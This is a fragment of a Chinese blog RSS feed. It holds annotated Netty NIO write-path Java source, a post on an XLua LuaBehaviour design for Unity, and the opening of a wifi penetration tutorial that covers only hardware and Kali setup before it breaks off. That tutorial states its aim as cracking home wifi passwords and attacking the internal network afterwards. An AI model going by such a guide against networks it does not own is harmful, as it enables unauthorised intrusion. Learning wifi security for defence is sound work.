                &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Ensure the pending writes are made of ByteBufs only.&lt;/span&gt;
            &lt;span&gt;int&lt;/span&gt; maxBytesPerGatheringWrite =&lt;span&gt; ((NioSocketChannelConfig) config).getMaxBytesPerGatheringWrite();
            ByteBuffer[] nioBuffers &lt;/span&gt;= in.nioBuffers(1024&lt;span&gt;, maxBytesPerGatheringWrite);
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; nioBufferCnt =&lt;span&gt; in.nioBufferCount();

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Always us nioBuffers() to workaround data-corruption.
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/2761&lt;/span&gt;
            &lt;span&gt;switch&lt;/span&gt;&lt;span&gt; (nioBufferCnt) {
                &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; 0&lt;span&gt;:
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; We have something else beside ByteBuffers to write so fallback to normal writes.&lt;/span&gt;
                    writeSpinCount -=&lt;span&gt; doWrite0(in);
                    &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; 1&lt;span&gt;: {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Only one ByteBuf so use non-gathering write
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Zero length buffers are not added to nioBuffers by ChannelOutboundBuffer, so there is no need
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; to check if the total size of all the buffers is non-zero.&lt;/span&gt;
                    ByteBuffer buffer = nioBuffers[0&lt;span&gt;];
                    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; attemptedBytes =&lt;span&gt; buffer.remaining();
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 向socket中写入数据，完事，写入多少数据量返回，以便判定是否写完&lt;/span&gt;
                    &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; localWrittenBytes =&lt;span&gt; ch.write(buffer);
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (localWrittenBytes &amp;lt;= 0&lt;span&gt;) {
                        incompleteWrite(&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
                        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
                    }
                    adjustMaxBytesPerGatheringWrite(attemptedBytes, localWrittenBytes, maxBytesPerGatheringWrite);
                    in.removeBytes(localWrittenBytes);
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 减少可写次数，超过最大可写次数，退出&lt;/span&gt;
                    --&lt;span&gt;writeSpinCount;
                    &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                }
                &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt;: {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Zero length buffers are not added to nioBuffers by ChannelOutboundBuffer, so there is no need
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; to check if the total size of all the buffers is non-zero.
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; We limit the max amount to int above so cast is safe&lt;/span&gt;
                    &lt;span&gt;long&lt;/span&gt; attemptedBytes =&lt;span&gt; in.nioBufferSize();
                    &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;long&lt;/span&gt; localWrittenBytes = ch.write(nioBuffers, 0&lt;span&gt;, nioBufferCnt);
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (localWrittenBytes &amp;lt;= 0&lt;span&gt;) {
                        incompleteWrite(&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
                        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
                    }
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Casting to int is safe because we limit the total amount of data in the nioBuffers to int above.&lt;/span&gt;
                    adjustMaxBytesPerGatheringWrite((&lt;span&gt;int&lt;/span&gt;) attemptedBytes, (&lt;span&gt;int&lt;/span&gt;&lt;span&gt;) localWrittenBytes,
                            maxBytesPerGatheringWrite);
                    in.removeBytes(localWrittenBytes);
                    &lt;/span&gt;--&lt;span&gt;writeSpinCount;
                    &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                }
            }
        } &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (writeSpinCount &amp;gt; 0&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 数据未写完，注册 OP_WRITE 事件&lt;/span&gt;
        incompleteWrite(writeSpinCount &amp;lt; 0&lt;span&gt;);
    }
    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; clearOpWrite() {
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; SelectionKey key =&lt;span&gt; selectionKey();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Check first if the key is still valid as it may be canceled as part of the deregistration
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; from the EventLoop
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/2104&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;key.isValid()) {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; interestOps =&lt;span&gt; key.interestOps();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 取消写事件监听&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; ((interestOps &amp;amp; SelectionKey.OP_WRITE) != 0&lt;span&gt;) {
            key.interestOps(interestOps &lt;/span&gt;&amp;amp; ~&lt;span&gt;SelectionKey.OP_WRITE);
        }
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 获取 nioBufers ----------------------------------------------------&lt;/span&gt;
    &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Returns an array of direct NIO buffers if the currently pending messages are made of {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ByteBuf} only.
     * {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; #nioBufferCount()} and {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; #nioBufferSize()} will return the number of NIO buffers in the returned
     * array and the total number of readable bytes of the NIO buffers respectively.
     * &amp;lt;p&amp;gt;
     * Note that the returned array is reused and thus should not escape
     * {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; AbstractChannel#doWrite(ChannelOutboundBuffer)}.
     * Refer to {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; NioSocketChannel#doWrite(ChannelOutboundBuffer)} for an example.
     * &amp;lt;/p&amp;gt;
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; maxCount The maximum amount of buffers that will be added to the return value.
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; maxBytes A hint toward the maximum number of bytes to include as part of the return value. Note that this
     *                 value maybe exceeded because we make a best effort to include at least 1 {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; ByteBuffer}
     *                 in the return value to ensure write progress is made.
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; ByteBuffer[] nioBuffers(&lt;span&gt;int&lt;/span&gt; maxCount, &lt;span&gt;long&lt;/span&gt;&lt;span&gt; maxBytes) {
        &lt;/span&gt;&lt;span&gt;assert&lt;/span&gt; maxCount &amp;gt; 0&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;assert&lt;/span&gt; maxBytes &amp;gt; 0&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;long&lt;/span&gt; nioBufferSize = 0&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; nioBufferCount = 0&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; InternalThreadLocalMap threadLocalMap =&lt;span&gt; InternalThreadLocalMap.get();
        ByteBuffer[] nioBuffers &lt;/span&gt;=&lt;span&gt; NIO_BUFFERS.get(threadLocalMap);
        Entry entry &lt;/span&gt;=&lt;span&gt; flushedEntry;
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (isFlushedEntry(entry) &amp;amp;&amp;amp; entry.msg &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; ByteBuf) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;entry.cancelled) {
                ByteBuf buf &lt;/span&gt;=&lt;span&gt; (ByteBuf) entry.msg;
                &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; readerIndex =&lt;span&gt; buf.readerIndex();
                &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; readableBytes = buf.writerIndex() -&lt;span&gt; readerIndex;

                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (readableBytes &amp;gt; 0&lt;span&gt;) {
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (maxBytes - readableBytes &amp;lt; nioBufferSize &amp;amp;&amp;amp; nioBufferCount != 0&lt;span&gt;) {
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If the nioBufferSize + readableBytes will overflow maxBytes, and there is at least one entry
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; we stop populate the ByteBuffer array. This is done for 2 reasons:
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 1. bsd/osx don't allow to write more bytes then Integer.MAX_VALUE with one writev(...) call
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; and so will return 'EINVAL', which will raise an IOException. On Linux it may work depending
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; on the architecture and kernel but to be safe we also enforce the limit here.
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 2. There is no sense in putting more data in the array than is likely to be accepted by the
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; OS.
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
                        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; See also:
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; - &lt;/span&gt;&lt;span&gt;https://www.freebsd.org/cgi/man.cgi?query=write&lt;/span&gt;&lt;span&gt;&amp;amp;sektion=2
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; - &lt;/span&gt;&lt;span&gt;http://linux.die.net/man/2/writev&lt;/span&gt;
                        &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                    }
                    nioBufferSize &lt;/span&gt;+=&lt;span&gt; readableBytes;
                    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; count =&lt;span&gt; entry.count;
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (count == -1&lt;span&gt;) {
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;noinspection ConstantValueVariableUse&lt;/span&gt;
                        entry.count = count =&lt;span&gt; buf.nioBufferCount();
                    }
                    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; neededSpace = min(maxCount, nioBufferCount +&lt;span&gt; count);
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (neededSpace &amp;gt;&lt;span&gt; nioBuffers.length) {
                        nioBuffers &lt;/span&gt;=&lt;span&gt; expandNioBufferArray(nioBuffers, neededSpace, nioBufferCount);
                        NIO_BUFFERS.set(threadLocalMap, nioBuffers);
                    }
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (count == 1&lt;span&gt;) {
                        ByteBuffer nioBuf &lt;/span&gt;=&lt;span&gt; entry.buf;
                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (nioBuf == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; cache ByteBuffer as it may need to create a new ByteBuffer instance if its a
                            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; derived buffer&lt;/span&gt;
                            entry.buf = nioBuf =&lt;span&gt; buf.internalNioBuffer(readerIndex, readableBytes);
                        }
                        nioBuffers[nioBufferCount&lt;/span&gt;++] =&lt;span&gt; nioBuf;
                    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                        ByteBuffer[] nioBufs &lt;/span&gt;=&lt;span&gt; entry.bufs;
                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (nioBufs == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; cached ByteBuffers as they may be expensive to create in terms
                            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; of Object allocation&lt;/span&gt;
                            entry.bufs = nioBufs =&lt;span&gt; buf.nioBuffers();
                        }
                        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; nioBufs.length &amp;amp;&amp;amp; nioBufferCount &amp;lt; maxCount; ++&lt;span&gt;i) {
                            ByteBuffer nioBuf &lt;/span&gt;=&lt;span&gt; nioBufs[i];
                            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (nioBuf == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;nioBuf.hasRemaining()) {
                                &lt;/span&gt;&lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
                            }
                            nioBuffers[nioBufferCount&lt;/span&gt;++] =&lt;span&gt; nioBuf;
                        }
                    }
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (nioBufferCount ==&lt;span&gt; maxCount) {
                        &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                    }
                }
            }
            entry &lt;/span&gt;=&lt;span&gt; entry.next;
        }
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.nioBufferCount =&lt;span&gt; nioBufferCount;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.nioBufferSize =&lt;span&gt; nioBufferSize;

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; nioBuffers;
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 未写完数据的处理: 注册OP_WRITE事件让后续eventloop处理
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.nio.AbstractNioByteChannel#incompleteWrite&lt;/span&gt;
    &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; incompleteWrite(&lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; setOpWrite) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Did not write completely.&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (setOpWrite) {
            setOpWrite();
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; It is possible that we have set the write OP, woken up by NIO because the socket is writable, and then
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; use our write quantum. In this case we no longer want to set the write OP because the socket is still
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; writable (as far as we know). We will find out next time we attempt to write if the socket is writable
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; and set the write OP if necessary.&lt;/span&gt;
&lt;span&gt;            clearOpWrite();

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Schedule flush again later so other tasks can be picked up in the meantime&lt;/span&gt;
&lt;span&gt;            eventLoop().execute(flushTask);
        }
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.nio.AbstractNioByteChannel#setOpWrite&lt;/span&gt;
    &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setOpWrite() {
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; SelectionKey key =&lt;span&gt; selectionKey();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Check first if the key is still valid as it may be canceled as part of the deregistration
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; from the EventLoop
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/2104&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;key.isValid()) {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; interestOps =&lt;span&gt; key.interestOps();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果数据未被写完整，则主动注册写事件监听，让 eventloop 去处理&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; ((interestOps &amp;amp; SelectionKey.OP_WRITE) == 0&lt;span&gt;) {
            key.interestOps(interestOps &lt;/span&gt;|&lt;span&gt; SelectionKey.OP_WRITE);
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　如上，写数据的过程理论都是通用的，都会先向应用缓冲中写入数据，然后再进行flush. netty 使用 DirectByteBuffer 进行写入优化，使用eventloop保证写入的完整性和及时性。&lt;/p&gt;

&lt;p&gt;　　本文通过netty 对网络事件的处理过程，以对通用网络io处理实现方式的理解必然有所加深。&lt;/p&gt;
</description>
<pubDate>Sat, 08 Aug 2020 13:12:00 +0000</pubDate>
<dc:creator>等你归去来</dc:creator>
<og:description>文接上一篇。上篇讲到netty暴露一个端口出来，acceptor, handler, pipeline, eventloop 都已准备好。但是并没体现其如何处理接入新的网络请求，今天我们就一起来看看吧</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/yougewe/p/13418559.html</dc:identifier>
</item>
<item>
<title>Xlua中LuaBehaviour的实现 - blueberryzzz</title>
<link>http://www.cnblogs.com/blueberryzzz/p/13460193.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/blueberryzzz/p/13460193.html</guid>
<description>&lt;p&gt;  在基于lua进行热更新的项目中，我们通常会通过luaBehaviour来让lua文件模拟MonoBehaviour，可以让lua文件拥有一些MonoBehaviour的生命周期，如Enable、Disable、Update。&lt;br/&gt;  同时可以注入一些UnityEngine.Object。在lua中方便的调用Unity中的对象。方便开发者进行开发。&lt;br/&gt;  本文进行介绍的luaBehaviour就是基于这个思路设计的，除了上面提到的特性之外还通过Json支持了更多类型的注入，Editor界面更人性化的展示，整个开发过程更接近MonoBehaviour的开发体验。&lt;/p&gt;

&lt;p&gt;1.新建继承LuaBehaviour的lua文件,通过AddDefineList添加需要序列化的信息。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1362861/202008/1362861-20200808202725671-180981621.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;2.直接把这个lua文件拖到CS中的LuaBehaviour上即可。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1362861/202008/1362861-20200808202739336-2016515853.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1362861/202008/1362861-20200808202750907-86292309.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;  接下来可以像MonoBehaviour一样对数据进行编辑了。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1362861/202008/1362861-20200808202804611-240842570.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;h2 id=&quot;脚本的序列化&quot;&gt;脚本的序列化&lt;/h2&gt;
&lt;p&gt;  luaBehaviour在使用的时候一般是通过记录名字或路径的方式来序列化lua文件的的。打包后通过这个路径从AssetBundle中进行lua文件的加载（这个是lua脚本热更新常用的策略，在这边就不多说了）。&lt;br/&gt;  这里还是通过路径来记录lua文件，但是不需要手动输入，而是通过直接拖动的方式间接记录lua文件路径。&lt;/p&gt;
&lt;h2 id=&quot;注入的方式&quot;&gt;注入的方式&lt;/h2&gt;
&lt;p&gt;  不通过C#侧定义注册信息，而是通过在Lua中先定义好要注册的类型和名称（更符合MonoBehaviour的开发姿势）。开发时，Editor读取lua中定义的类型和名称信息，展示在Inspector中，供开发者编辑。&lt;br/&gt;  在运行时再将序列化的数据注入到lua实例中。&lt;/p&gt;
&lt;h3 id=&quot;序列化的实现&quot;&gt;序列化的实现&lt;/h3&gt;
&lt;h4 id=&quot;unityengineobject类型对象的序列化&quot;&gt;UnityEngine.Object类型对象的序列化&lt;/h4&gt;
&lt;p&gt;  这种类型没啥特别的，在LuaBehaviour脚本中定义一个记录key和UnityEngine.Object的List即可。&lt;/p&gt;
&lt;h4 id=&quot;其他类型的序列化&quot;&gt;其他类型的序列化&lt;/h4&gt;
&lt;p&gt;  非UnityEngine.Object类型就没有一个统一的格式，无法通过一个列表简单的进行记录。但是我们查看Prefab的实例可以发现，Prefab序列化的数据其实和Json很像。对在MonoBehaviour中定义的各个字段的序列化姿势也和Json很像。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1362861/202008/1362861-20200808202819512-589898498.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;  所以这里考虑使用Json来序列化非UnityEngine.Object类型的对象。刚好Unity由提供了一套简单高效的Json工具JsonUtility。JsonUtility内部就是通过Unity serializer实现的，所以稳定性很有保证。&lt;br/&gt;  但是JsonUtility有个缺点，只能序列化一部分类型，不能序列化如Int、List这种类型。&lt;br/&gt;  为了解决这个问题。这里在序列化的时候通过泛型为每个类型生成一个Wrap类型。即可通用的实现各种类型的序列化。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1362861/202008/1362861-20200808202828285-588686120.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;注入的实现&quot;&gt;注入的实现&lt;/h3&gt;
&lt;h4 id=&quot;unityengineobject类型对象的注入&quot;&gt;UnityEngine.Object类型对象的注入&lt;/h4&gt;
&lt;p&gt;  也没啥好说的，直接根据key向Lua实例中Set即可。&lt;/p&gt;
&lt;h4 id=&quot;其他类型的注入&quot;&gt;其他类型的注入&lt;/h4&gt;
&lt;p&gt;  先实例化为Wrap对象，然后再取出其中的需要注入的对象，Set到Lua对象中即可。&lt;/p&gt;
&lt;h3 id=&quot;inspector界面中的展示&quot;&gt;Inspector界面中的展示&lt;/h3&gt;
&lt;h4 id=&quot;unityengineobject类型对象的展示&quot;&gt;UnityEngine.Object类型对象的展示&lt;/h4&gt;
&lt;p&gt;  UnityEngine.Object类型统一使用EditorGUILayout.ObjectField绘制即可。&lt;/p&gt;
&lt;h4 id=&quot;其他类型的展示&quot;&gt;其他类型的展示&lt;/h4&gt;
&lt;p&gt;  因为没有找到一个通用的可以表现所有对象的绘制方式，所以这里也做了一个转换。先通过Emit生成一个继承自ScriptableObject的类（因为ScriptableObject是UntiyEngine.Object，所以可以使用SerializedObject来绘制。同时可以直接通过ScriptableObject.CreateInstance进行实例的创建）。把需要绘制的对象放到这个类里面，然后通过EditorGUILayout.PropertyField绘制即可。&lt;/p&gt;
&lt;h2 id=&quot;enable、update等函数的调用&quot;&gt;Enable、Update等函数的调用&lt;/h2&gt;
&lt;p&gt;  这里把Update、FixedUpdate等高频或者很少使用的函数拆分出去，只有在Lua中定义了这些函数，才添加对应的Assistant脚本对这些函数进行调用。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1362861/202008/1362861-20200808202839491-236673305.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;  Enable、Disable、Destroy这三个常用函数，就直接放在LuaBehaviour脚本中进行调用。&lt;/p&gt;

&lt;ol&gt;&lt;li&gt;这篇文章只起到大致思路和关键点的说明，具体细节可以直接看代码，代码比较少也比较清晰。&lt;/li&gt;
&lt;li&gt;通过Wrap的方式序列化各种对象的方式其实也可以考虑用到一些用户数据在客户端的持久化。&lt;/li&gt;
&lt;li&gt;因为这边主要展示LuaBehanviour的功能，所以AssetBundle的生成和从AssetBundle中加载lua文件都写得很临时，仅作展示用。&lt;/li&gt;
&lt;li&gt;打包测试之前要用AssetBundles-&amp;gt;Build AssetBundle For Lua生成一下bundle。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;项目链接：&lt;/strong&gt;&lt;a href=&quot;https://github.com/blueberryzzz/LuaBehaviour&quot;&gt;https://github.com/blueberryzzz/LuaBehaviour&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 08 Aug 2020 12:33:00 +0000</pubDate>
<dc:creator>blueberryzzz</dc:creator>
<og:description>简介 在基于lua进行热更新的项目中，我们通常会通过luaBehaviour来让lua文件模拟MonoBehaviour，可以让lua文件拥有一些MonoBehaviour的生命周期，如Enable、</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/blueberryzzz/p/13460193.html</dc:identifier>
</item>
<item>
<title>wifi渗透 - Lmg66</title>
<link>http://www.cnblogs.com/Lmg66/p/13442363.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Lmg66/p/13442363.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;本文主要讲述 &lt;strong&gt;家庭家庭家庭中&lt;/strong&gt;（重要的事情说三遍，企业认证服务器的wifi一般非常非常的安全破解不来）如何破解wifi密码，破解wifi密码后的内网渗透利用(简单说明)，如何设置wifi路由器更安全，从渗透的方面看wifi安全，根据需求选择观看&lt;/p&gt;
&lt;h2 id=&quot;wifi渗透环境的打造&quot;&gt;wifi渗透环境的打造&lt;/h2&gt;
&lt;h3 id=&quot;硬件方面&quot;&gt;硬件方面&lt;/h3&gt;
&lt;p&gt;需要支持监听模式的无线网卡，一般电脑自带的无线网卡是不支持监听模式的，需要购买&lt;br/&gt;内置kail驱动 RT3070 RTL8187(推荐使用)&lt;br/&gt;我购买的链接如下，用着还行，监听信号比手机强那么一点点&lt;br/&gt;&lt;a href=&quot;https://m.tb.cn/h.VGGIItU?sm=0b7bf6&quot;&gt;https://m.tb.cn/h.VGGIItU?sm=0b7bf6&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;软件方面&quot;&gt;软件方面&lt;/h3&gt;
&lt;p&gt;因为wifi破解需要软件支持，Windows下载麻烦，推荐kali(因为kali自带很多工具)&lt;br/&gt;因为用到kali，建议使用vmware虚拟机，不建议小白双系统kali或者Microsoft Store中的kali&lt;br/&gt;vmware下载查看：&lt;a href=&quot;https://www.52pojie.cn/thread-1026907-1-1.html&quot;&gt;https://www.52pojie.cn/thread-1026907-1-1.html&lt;/a&gt;&lt;br/&gt;&lt;strong&gt;注意&lt;/strong&gt;：无线网卡监听模式时如果出现vmware卡代码，监听时间长就停止的情况建议更换上面这个文章的vmware版本&lt;br/&gt;kali的vm镜像下载，下载解压，vmware打开即可使用，下载地址: &lt;a href=&quot;https://images.offensive-security.com/virtual-images/kali-linux-2020.2a-vmware-amd64.7z?_ga=2.152625529.1921388440.1596879427-46569499.1595490768&quot;&gt;https://images.offensive-security.com/virtual-images/kali-linux-2020.2a-vmware-amd64.7z?_ga=2.152625529.1921388440.1596879427-46569499.1595490768&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;vmware和kali和无线网卡基础知识选看&quot;&gt;vmware和kali和无线网卡基础知识(选看)&lt;/h3&gt;
&lt;h4 id=&quot;usb无线网卡在kali-linux的使用&quot;&gt;USB无线网卡在kali Linux的使用&lt;/h4&gt;
&lt;ol&gt;&lt;li&gt;先不要开机 先打开服务&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2092671/202008/2092671-20200805202558437-354553282.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/li&gt;
